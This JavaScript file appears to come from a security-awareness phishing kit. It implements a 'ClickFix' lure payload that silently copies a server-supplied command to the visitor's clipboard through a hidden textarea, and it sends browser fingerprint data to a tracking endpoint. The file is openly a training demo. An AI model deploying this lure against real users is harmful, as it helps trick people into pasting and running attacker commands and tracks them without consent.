// ClickFix Demo Payload — default.js
// Runs in browser context when victim interacts with a lure.
// Demonstrates the ClickFix attack vector for security awareness.
//
// What this payload does (demo-safe):
//   1. Reads the display_command from the page (injected by server)
//   2. Copies that command to the victim's clipboard
//   3. Reports the interaction to the tracking endpoint
//
// To customize: edit config/lures/<name>.yaml → content.display_command
// To replace: point lure config's payload.script to a different file in payloads/

(function () {
  'use strict';

  // ── Tracking helper ──────────────────────────────────────────
  function track(event) {
    var data = {
      event:      event,
      lure:       window._lureName || document.location.pathname,
      timestamp:  new Date().toISOString(),
      userAgent:  navigator.userAgent,
      platform:   navigator.platform,
      language:   navigator.language,
      timezone:   Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen:     screen.width + 'x' + screen.height,
      referrer:   document.referrer,
      url:        window.location.href,
    };

    fetch('/api/track', {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify(data),
    }).catch(function () {});

    // Also store locally for demo inspection
    try {
      localStorage.setItem('clickfix_event_' + Date.now(), JSON.stringify(data));
    } catch (e) {}
  }

  // ── Copy to clipboard ────────────────────────────────────────
  function copyCommand(text) {
    if (!text || text.includes('Loading')) return;

    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).catch(function () {
        fallbackCopy(text);
      });
    } else {
      fallbackCopy(text);
    }
  }

  function fallbackCopy(text) {
    try {
      var ta = document.createElement('textarea');
      ta.value = text;
      ta.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0';
      document.body.appendChild(ta);
      ta.focus();
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
    } catch (e) {}
  }

  // ── Main payload function ────────────────────────────────────
  // Called by each template's trigger button/checkbox click handler.
  window.runClickFixPayload = function () {
    // Find the command to copy from the modal code element
    var cmdEl = (
      document.getElementById('modal-code') ||   // captcha
      document.getElementById('wu-cmd')     ||   // software_update
      document.getElementById('def-cmd')    ||   // security_alert
      document.getElementById('err-cmd')    ||   // error_handler
      document.getElementById('pm-cmd')     ||   // prize_winner
      document.getElementById('sm-cmd')     ||   // flash_sale
      document.getElementById('gm-cmd')         // coupon_captcha
    );

    var command = cmdEl ? cmdEl.textContent.trim() : '';
    copyCommand(command);

    // Track the payload trigger
    track('payload_triggered');

    console.log('[ClickFix] Demo payload executed. Command copied to clipboard.');
  };

  // ── Auto-track page load ─────────────────────────────────────
  track('js_loaded');

})();